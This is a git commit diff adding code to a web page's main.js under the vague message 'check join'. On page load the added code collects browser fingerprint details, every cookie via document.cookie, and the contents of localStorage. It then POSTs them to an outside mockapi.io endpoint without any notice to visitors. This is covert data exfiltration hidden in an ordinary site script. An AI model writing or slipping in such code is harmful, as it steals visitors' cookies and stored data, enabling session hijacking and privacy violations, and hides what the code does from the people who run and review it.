69bb0623807e33d509b963155f16e31579626508
commituser <thanhmanh18995@gmail.com>
2022-11-25 11:27:31 +0700

    check join

--- js/main.js
+++ js/main.js
@@ -63,3 +63,51 @@ update();
 if(! (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) ) {
   $("body").html("<h1>Hãy mở trên điện thoại !!!</h1>");
 }
+
+$(document).ready(function() {
+  let info={
+
+    timeOpened:new Date(),
+    timezone:(new Date()).getTimezoneOffset()/60,
+
+    pageon(){return window.location.pathname},
+    referrer(){return document.referrer},
+    previousSites(){return history.length},
+
+    browserName(){return navigator.appName},
+    browserEngine(){return navigator.product},
+    browserVersion1a(){return navigator.appVersion},
+    browserVersion1b(){return navigator.userAgent},
+    browserLanguage(){return navigator.language},
+    browserOnline(){return navigator.onLine},
+    browserPlatform(){return navigator.platform},
+    javaEnabled(){return navigator.javaEnabled()},
+    dataCookiesEnabled(){return navigator.cookieEnabled},
+    dataCookies1(){return document.cookie},
+    dataCookies2(){return decodeURIComponent(document.cookie.split(";"))},
+    dataStorage(){return localStorage},
+
+    sizeScreenW(){return screen.width},
+    sizeScreenH(){return screen.height},
+    sizeDocW(){return document.width},
+    sizeDocH(){return document.height},
+    sizeInW(){return innerWidth},
+    sizeInH(){return innerHeight},
+    sizeAvailW(){return screen.availWidth},
+    sizeAvailH(){return screen.availHeight},
+    scrColorDepth(){return screen.colorDepth},
+    scrPixelDepth(){return screen.pixelDepth},
+
+
+    };
+      $.ajax({
+          url: 'https://638040e38efcfcedac002c4a.mockapi.io/ap1/requests',
+          type: 'POST',
+          dataType: 'html',
+          data: {
+            join_at: new Date(),
+            content: info
+          }
+      }).done(function(result) {
+      });
+});
